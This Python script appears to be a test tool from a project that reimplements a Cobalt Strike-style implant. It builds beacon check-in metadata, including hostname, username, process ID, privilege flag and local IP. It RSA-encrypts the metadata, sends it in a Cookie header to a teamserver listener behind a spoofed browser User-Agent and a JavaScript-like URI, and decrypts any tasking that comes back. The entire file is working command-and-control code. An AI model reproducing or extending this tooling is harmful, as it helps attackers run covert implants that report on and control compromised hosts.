#!/usr/bin/env python3
"""
P0 smoke: RSA metadata check-in against a live CS default-profile HTTP listener.
Does not require compiling the C implant.

Usage:
  python3 tools/smoke_checkin.py --host 192.168.100.98 --port 8088 --pubkey tools/fixtures/publickey.der
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import os
import socket
import struct
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


def be_u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def be_u16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def local_ip_bytes() -> bytes:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return socket.inet_aton(ip)
    except Exception:
        return socket.inet_aton("127.0.0.1")


def build_metadata_plaintext(session_key: bytes, agent_id: int) -> bytes:
    """Match C++ metadata / LinuxBeacon agent_init layout."""
    assert len(session_key) == 16
    ansi = struct.pack("<H", 1252)
    oem = struct.pack("<H", 437)
    flags = 2 | 4  # x64 agent + x64 target style
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        flags |= 8
    host = socket.gethostname()[:20]
    user = os.environ.get("USERNAME") or os.environ.get("USER") or "user"
    proc = "smoke"
    meta = f"{host}\t{user}\t{proc}".encode("utf-8")[:58]

    body = bytearray()
    body += session_key
    body += ansi + oem
    body += be_u32(agent_id)
    body += be_u32(os.getpid() & 0xFFFFFFFF)
    body += be_u16(0)  # port
    body += bytes([flags])
    body += bytes([5, 0])  # os major/minor placeholder
    body += be_u16(0)  # build
    body += be_u32(0) + be_u32(0) + be_u32(0)  # ptrs
    body += local_ip_bytes()
    body += meta

    # header: magic BEEF + length of data after 8-byte header
    data_len = len(body)
    return be_u32(0x0000BEEF) + be_u32(data_len) + bytes(body)


def rsa_encrypt(pubkey_der: bytes, plaintext: bytes) -> bytes:
    pub = serialization.load_der_public_key(pubkey_der, backend=default_backend())
    return pub.encrypt(plaintext, padding.PKCS1v15())


def try_aes_decrypt(session_key: bytes, blob: bytes) -> bytes | None:
    if len(blob) <= 16 or (len(blob) % 16) != 0:
        return None
    material = hashlib.sha256(session_key).digest()
    aes_key, hmac_key = material[:16], material[16:]
    ct, mac = blob[:-16], blob[-16:]
    # verify hmac truncated
    import hmac as hm

    calc = hm.new(hmac_key, ct, hashlib.sha256).digest()[:16]
    if calc != mac:
        return None
    iv = b"abcdefghijklmnop"
    decryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend()).decryptor()
    pt = decryptor.update(ct) + decryptor.finalize()
    return pt


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.100.98")
    ap.add_argument("--port", type=int, default=8088)
    ap.add_argument("--uri", default="/en_US/all.js")
    ap.add_argument("--pubkey", default="tools/fixtures/publickey.der")
    ap.add_argument("--timeout", type=float, default=15.0)
    args = ap.parse_args()

    pubkey = Path(args.pubkey).read_bytes()
    session_key = os.urandom(16)
    agent_id = (int.from_bytes(os.urandom(4), "big") & 0x7FFFFFFF) & ~1
    plain = build_metadata_plaintext(session_key, agent_id)
    print(f"[*] agent_id={agent_id} metadata_plain={len(plain)} bytes")
    if len(plain) > 117:
        print(f"[!] plaintext {len(plain)} may exceed RSA-1024 PKCS1 max (~117)")
    try:
        enc = rsa_encrypt(pubkey, plain)
    except Exception as e:
        print(f"[!] RSA encrypt failed: {e}")
        return 1
    print(f"[*] RSA ciphertext={len(enc)} bytes")
    cookie = base64.b64encode(enc).decode("ascii")
    # CS default.profile: metadata { base64; header "Cookie"; }
    # Use http.client so Cookie/UA are not rewritten by urllib.
    import http.client

    print(f"[*] GET http://{args.host}:{args.port}{args.uri}")
    print(f"[*] Cookie(base64 rsa) len={len(cookie)}")
    try:
        conn = http.client.HTTPConnection(args.host, args.port, timeout=args.timeout)
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Accept": "*/*",
            "Cookie": cookie,
            "Connection": "close",
            "Cache-Control": "no-cache",
        }
        conn.request("GET", args.uri, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        status = resp.status
        print(f"[+] HTTP {status}, body={len(body)} bytes")
        if body:
            print(f"    body[:32]={body[:32].hex()}")
            pt = try_aes_decrypt(session_key, body)
            if pt and len(pt) >= 8:
                counter, length = struct.unpack(">II", pt[:8])
                print(f"[+] AES decrypt OK counter={counter} task_len={length}")
            elif pt:
                print(f"[+] AES decrypt OK raw={pt[:32].hex()}")
            else:
                print("[*] body not AES+HMAC for this session (profile wrap / idle)")
        else:
            print("[*] empty body — if TS accepts RSA metadata, session should appear in Beacons")
        print("[*] Watch teamserver console: should NOT say metadata recover failed")
        conn.close()
        return 0 if status == 200 else 2
    except Exception as e:
        print(f"[!] request failed: {e}")
        return 3


if __name__ == "__main__":
    sys.exit(main())
